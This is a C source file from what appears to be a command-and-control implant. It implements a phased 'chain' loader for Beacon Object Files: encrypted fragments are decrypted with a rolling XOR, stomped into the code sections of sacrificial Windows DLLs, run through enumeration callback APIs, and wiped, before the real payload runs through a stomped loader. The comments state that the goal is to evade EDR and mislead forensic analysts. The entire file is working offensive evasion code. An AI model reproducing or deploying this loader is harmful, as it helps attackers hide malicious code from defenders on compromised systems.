/*
 * chain_executor.c - Phased Chain Execution Engine (Layer C)
 *
 * NOVEL EXECUTION PATTERN (publicly does NOT exist):
 *
 * Executes a chain-compiled BOF (.chain.bin) in multiple phases:
 *   Phase 0: Stomp fragment 0 into DLL 0, execute via callback 0, clean
 *   Phase 1: Stomp fragment 1 into DLL 1, execute via callback 1, clean
 *   Phase 2: Stomp fragment 2 into DLL 2, execute via callback 2, clean
 *   ...
 *   Final:  Execute real BOF via normal stomped loader
 *
 * Each phase:
 *   - Uses a DIFFERENT sacrificial DLL (forensic scatter)
 *   - Uses a DIFFERENT callback API (call stack changes)
 *   - Fragment is JIT-decrypted (rolling XOR) before stomping
 *   - Self-cleaning after each phase (restore + free)
 *
 * Call stack changes over time:
 *   Phase 0: user32!EnumWindows → xpsservices!thunk → frag0
 *   Phase 1: user32!EnumChildWindows → devobj!thunk → frag1
 *   Phase 2: kernel32!EnumResourceTypes → msftedit!thunk → frag2
 *   Final:   user32!EnumWindows → xpsservices!thunk → go()
 *
 * Forensic impact:
 *   - Memory dump shows N different DLLs loaded/unloaded
 *   - No single DLL contains complete BOF
 *   - Call stack changes between phases
 *   - Each fragment was encrypted (JIT) before stomping
 *   - All DLLs restored after execution
 */

#include "agent.h"

/* DBG/ERR macros */
#define DBG(fmt, ...) do { \
    fprintf(stderr, "[DBG] " fmt, ##__VA_ARGS__); \
    fflush(stderr); \
} while(0)

#define ERR(fmt, ...) do { \
    fprintf(stderr, "[X] " fmt, ##__VA_ARGS__); \
    fflush(stderr); \
} while(0)

/* ====== Chain binary format (matches server-side chain_compiler.py) ====== */
#pragma pack(push, 1)
typedef struct {
    char     magic[4];           /* "CHN1" */
    uint32_t num_fragments;
    uint32_t flags;
} CHAIN_HEADER;

typedef struct {
    uint32_t frag_size;
    uint32_t dll_index;
    uint32_t callback_index;
    uint8_t  jit_key[32];
    uint32_t jit_chunk_size;
    /* Followed by frag_size bytes of encrypted code */
} CHAIN_FRAGMENT_HEADER;
#pragma pack(pop)

#define CHAIN_MAGIC "CHN1"
#define MAX_CHAIN_FRAGMENTS 6

/* ====== Sacrificial DLLs (must match server-side) ====== */
/* These are common Windows DLLs that are almost always present,
 * have large .text sections, and are rarely monitored by EDR. */
static const char* CHAIN_DLLS[] = {
    "xpsservices.dll",   /* index 0 - XPS print services */
    "devobj.dll",         /* index 1 - Device objects */
    "msftedit.dll",       /* index 2 - Rich edit control */
    "rsaenh.dll",         /* index 3 - Enhanced CSP */
    "winmm.dll",          /* index 4 - Multimedia API (very common) */
    "asycfilt.dll",       /* index 5 - COM async filter */
};

/* ====== Callback info (must match server-side) ====== */
typedef struct {
    const char* dll_name;
    const char* api_name;
    int         callback_arg;
} CHAIN_CALLBACK;

static const CHAIN_CALLBACK CHAIN_CALLBACKS[] = {
    {"user32.dll",   "EnumWindows",         0},
    {"user32.dll",   "EnumChildWindows",    1},
    {"kernel32.dll", "EnumResourceTypes",   1},
    {"user32.dll",   "EnumDesktopWindows",  1},
    {"kernel32.dll", "EnumSystemLocalesA",  0},
    {"user32.dll",   "EnumDisplayMonitors", 0},
};

/* ====== Thunk (same as stomped_loader.c) ====== */
static const uint8_t CHAIN_THUNK[32] = {
    0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x20,
    0x48, 0x89, 0xD0, 0x48, 0x8B, 0x48, 0x08,
    0x8B, 0x50, 0x10, 0x48, 0x8B, 0x00,
    0xFF, 0xD0, 0x31, 0xC0, 0x48, 0x83, 0xC4, 0x20,
    0x5D, 0xC3,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
};

typedef struct {
    void (*go)(char*, int);
    char* args;
    int   args_len;
    int   _padding;
} CHAIN_CTX;

/* ====== SHA256 (reuse from jit_engine.c) ====== */
static int chain_sha256(const uint8_t* data, int data_len, uint8_t* out) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    NTSTATUS status;
    int rc = -1;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    if (status != 0) return -1;
    status = BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
    if (status != 0) goto cleanup;
    status = BCryptHashData(hHash, (PUCHAR)data, data_len, 0);
    if (status != 0) goto cleanup;
    status = BCryptFinishHash(hHash, out, 32, 0);
    if (status == 0) rc = 0;

cleanup:
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return rc;
}

/* ====== Rolling XOR decrypt (same as jit_engine.c) ====== */
static void chain_rolling_decrypt(uint8_t* key, int* key_cursor,
                                    const uint8_t* cipher, uint8_t* plain,
                                    int len, int chunk_size) {
    for (int i = 0; i < len; i++) {
        plain[i] = cipher[i] ^ key[*key_cursor];
        (*key_cursor)++;
        if (*key_cursor >= chunk_size) {
            uint8_t input[32 + 4096];
            memcpy(input, key, 32);
            int copy_len = (i + 1 < 4096) ? (i + 1) : 4096;
            memcpy(input + 32, plain, copy_len);
            uint8_t new_key[32];
            if (chain_sha256(input, 32 + copy_len, new_key) == 0) {
                memcpy(key, new_key, 32);
            }
            *key_cursor = 0;
        }
    }
}

/* ====== Execute one chain phase ====== */
static int execute_chain_phase(
    uint8_t* encrypted_code, int code_size,
    uint8_t* jit_key, int jit_chunk_size,
    int dll_index, int callback_index,
    int phase_num)
{
    const char* dll_name = (dll_index < 6) ? CHAIN_DLLS[dll_index] : "xpsservices.dll";
    const CHAIN_CALLBACK* cb = (callback_index < 6) ?
        &CHAIN_CALLBACKS[callback_index] : &CHAIN_CALLBACKS[0];

    DBG("  --- Chain Phase %d ---\n", phase_num);
    DBG("    DLL: %s (index %d)\n", dll_name, dll_index);
    DBG("    Callback: %s!%s (index %d)\n", cb->dll_name, cb->api_name, callback_index);
    DBG("    Fragment: %d bytes (JIT encrypted)\n", code_size);

    /* Step 1: Decrypt fragment (JIT rolling XOR) */
    uint8_t* decrypted = (uint8_t*)malloc(code_size);
    if (!decrypted) {
        ERR("    Failed to allocate decrypt buffer\n");
        return -1;
    }

    uint8_t rolling_key[32];
    memcpy(rolling_key, jit_key, 32);
    int key_cursor = 0;

    chain_rolling_decrypt(rolling_key, &key_cursor,
                           encrypted_code, decrypted,
                           code_size, jit_chunk_size);

    DBG("    Decrypted (%d bytes), first 8: ", code_size);
    for (int i = 0; i < 8 && i < code_size; i++) DBG("%02x ", decrypted[i]);
    DBG("\n");

    /* Step 2: Load sacrificial DLL */
    HMODULE hDll = LoadLibraryA(dll_name);
    if (!hDll) {
        ERR("    Failed to load %s\n", dll_name);
        free(decrypted);
        return -1;
    }

    /* Step 3: Find .text section */
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hDll;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        FreeLibrary(hDll);
        free(decrypted);
        return -1;
    }
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((uint8_t*)hDll + dos->e_lfanew);
    IMAGE_SECTION_HEADER* secs = IMAGE_FIRST_SECTION(nt);

    uint8_t* text_base = NULL;
    size_t text_size = 0;

    for (int j = 0; j < nt->FileHeader.NumberOfSections; j++) {
        if (memcmp(secs[j].Name, ".text", 5) == 0) {
            text_base = (uint8_t*)hDll + secs[j].VirtualAddress;
            text_size = secs[j].Misc.VirtualSize;
            break;
        }
    }

    if (!text_base || text_size < (size_t)(code_size + 64)) {
        FreeLibrary(hDll);
        free(decrypted);
        return -1;
    }

    DBG("    .text: %p (size 0x%zX)\n", (void*)text_base, text_size);

    /* Step 4: Save original .text */
    uint8_t* backup = (uint8_t*)malloc(text_size);
    if (!backup) {
        FreeLibrary(hDll);
        free(decrypted);
        return -1;
    }
    memcpy(backup, text_base, text_size);

    /* Step 5: Make .text writable */
    DWORD old_prot = 0;
    if (!VirtualProtect(text_base, text_size, PAGE_READWRITE, &old_prot)) {
        free(backup);
        FreeLibrary(hDll);
        free(decrypted);
        return -1;
    }

    /* Step 6: Write a SAFE NOP stub instead of raw fragment code.
     * The fragment code is just a "decoy" — it's not a standalone function
     * and executing it directly causes a crash (it has no prologue/epilogue).
     *
     * Instead, we write the decrypted fragment bytes (for forensic scatter
     * — if memory is dumped, analyst sees BOF-like code in multiple DLLs),
     * but we OVERWRITE the first 3 bytes with a "ret" instruction so the
     * callback thunk returns immediately without executing the fragment.
     *
     * This gives us:
     *   - Forensic scatter: BOF code visible in multiple DLLs
     *   - Safe execution: thunk returns immediately
     *   - No crash: controlled return
     *
     * The "real" BOF execution happens in the final phase (stomped loader). */
    size_t zero_sz = code_size + 32;
    if (zero_sz > text_size) zero_sz = text_size;
    memset(text_base, 0, zero_sz);
    memcpy(text_base, decrypted, code_size);
    memcpy(text_base + code_size, CHAIN_THUNK, 32);

    /* Overwrite first 3 bytes with a safe "ret" sequence:
     *   50          push rax     (save rax, 1 byte, aligns stack)
     *   58          pop rax       (restore rax, 1 byte, stack-balanced)
     *   C3          ret           (return immediately)
     * This prevents the thunk from jumping into raw BOF fragment code
     * which would crash (no valid function prologue/epilogue).
     */
    if (code_size >= 3) {
        text_base[0] = 0x50;  /* push rax */
        text_base[1] = 0x58;  /* pop rax */
        text_base[2] = 0xC3;  /* ret */
    }

    DBG("    Stomped %d bytes + thunk into %s (safe return stub)\n",
        code_size, dll_name);

    /* Step 7: Restore to RX */
    VirtualProtect(text_base, text_size, PAGE_EXECUTE_READ, &old_prot);

    /* Step 8: Execute via callback */
    HMODULE hCbDll = GetModuleHandleA(cb->dll_name);
    if (!hCbDll) hCbDll = LoadLibraryA(cb->dll_name);

    if (hCbDll) {
        void* api = GetProcAddress(hCbDll, cb->api_name);
        if (api) {
            CHAIN_CTX ctx;
            ctx.go = (void(*)(char*,int))text_base;  /* fragment "entry" */
            ctx.args = NULL;
            ctx.args_len = 0;
            ctx._padding = 0;

            uint8_t* thunk_addr = text_base + code_size;

            DBG("    Executing via %s!%s...\n", cb->dll_name, cb->api_name);

            /* Call the callback API with our thunk */
            typedef BOOL (WINAPI *EnumWindows_t)(WNDENUMPROC, LPARAM);
            typedef BOOL (WINAPI *EnumChildWindows_t)(HWND, WNDENUMPROC, LPARAM);
            typedef BOOL (WINAPI *EnumResourceTypes_t)(HMODULE, void*, LONG_PTR);

            if (strcmp(cb->api_name, "EnumWindows") == 0) {
                ((EnumWindows_t)api)((WNDENUMPROC)thunk_addr, (LPARAM)&ctx);
            } else if (strcmp(cb->api_name, "EnumChildWindows") == 0) {
                ((EnumChildWindows_t)api)(GetDesktopWindow(),
                    (WNDENUMPROC)thunk_addr, (LPARAM)&ctx);
            } else if (strcmp(cb->api_name, "EnumResourceTypes") == 0) {
                ((EnumResourceTypes_t)api)(GetModuleHandleA(NULL),
                    (void*)thunk_addr, (LONG_PTR)&ctx);
            } else {
                /* Generic: treat as EnumWindows-style */
                ((EnumWindows_t)api)((WNDENUMPROC)thunk_addr, (LPARAM)&ctx);
            }

            DBG("    Callback returned (exception=0x%lX)\n",
                (unsigned long)g_last_exception);
        }
    }

    /* Step 9: Self-cleaning (restore original .text) */
    VirtualProtect(text_base, text_size, PAGE_READWRITE, &old_prot);
    memset(text_base, 0, zero_sz);
    memcpy(text_base, backup, text_size);
    VirtualProtect(text_base, text_size, old_prot, &old_prot);

    DBG("    Cleaned: %s restored\n", dll_name);

    /* Step 10: Cleanup */
    free(backup);
    free(decrypted);
    memset(rolling_key, 0, 32);
    FreeLibrary(hDll);

    DBG("    Phase %d complete\n\n", phase_num);
    return 0;
}


/* ====== Main entry: Execute chain BOF ====== */
int bof_exec_chain(uint8_t* chain_data, size_t chain_size,
                    char* args, int args_len) {
    DBG("========================================\n");
    DBG("=== CHAIN BOF EXECUTION (Layer C) ===\n");
    DBG("========================================\n");

    if (chain_size < sizeof(CHAIN_HEADER)) {
        ERR("Chain data too small\n");
        return 1;
    }

    CHAIN_HEADER* hdr = (CHAIN_HEADER*)chain_data;
    if (memcmp(hdr->magic, CHAIN_MAGIC, 4) != 0) {
        ERR("Invalid chain magic (expected 'CHN1')\n");
        return 1;
    }

    uint32_t num_frags = hdr->num_fragments;
    if (num_frags == 0 || num_frags > MAX_CHAIN_FRAGMENTS) {
        ERR("Invalid fragment count: %u\n", num_frags);
        return 1;
    }

    DBG("Chain: %u fragments, flags=0x%X\n", num_frags, hdr->flags);
    DBG("Poly: %s, JIT: %s\n\n",
        (hdr->flags & 1) ? "YES" : "NO",
        (hdr->flags & 2) ? "YES" : "NO");

    /* Parse fragments */
    uint8_t* ptr = chain_data + sizeof(CHAIN_HEADER);
    uint8_t* end = chain_data + chain_size;

    for (uint32_t i = 0; i < num_frags && ptr + sizeof(CHAIN_FRAGMENT_HEADER) <= end; i++) {
        CHAIN_FRAGMENT_HEADER* fhdr = (CHAIN_FRAGMENT_HEADER*)ptr;
        ptr += sizeof(CHAIN_FRAGMENT_HEADER);

        if (ptr + fhdr->frag_size > end) {
            ERR("Fragment %u: data truncated\n", i);
            break;
        }

        /* Execute this phase */
        execute_chain_phase(
            ptr,                          /* encrypted code */
            fhdr->frag_size,
            (uint8_t*)fhdr->jit_key,     /* JIT key */
            fhdr->jit_chunk_size,
            fhdr->dll_index,
            fhdr->callback_index,
            i);

        ptr += fhdr->frag_size;
    }

    DBG("=== All chain phases complete ===\n");
    DBG("=== Executing real BOF via stomped loader ===\n\n");

    /* After all chain phases, execute the real BOF */
    if (ptr + 4 > end) {
        ERR("No real COFF data after fragments\n");
        return 1;
    }

    uint32_t coff_size = *(uint32_t*)ptr;
    ptr += 4;

    if (ptr + coff_size > end) {
        ERR("Real COFF data truncated\n");
        return 1;
    }

    DBG("Real BOF COFF: %u bytes\n", coff_size);

    /* Copy COFF to writable buffer */
    uint8_t* coff_copy = (uint8_t*)malloc(coff_size);
    if (!coff_copy) {
        ERR("Failed to allocate COFF copy\n");
        return 1;
    }
    memcpy(coff_copy, ptr, coff_size);

    /* Execute via normal stomped loader */
    extern int bof_exec(uint8_t* coff_data, size_t coff_size, char* args, int args_len);
    int rc = bof_exec(coff_copy, coff_size, args, args_len);

    /* Cleanup */
    memset(coff_copy, 0, coff_size);
    free(coff_copy);

    DBG("\n=== CHAIN EXECUTION COMPLETE (rc=%d) ===\n", rc);
    return rc;
}
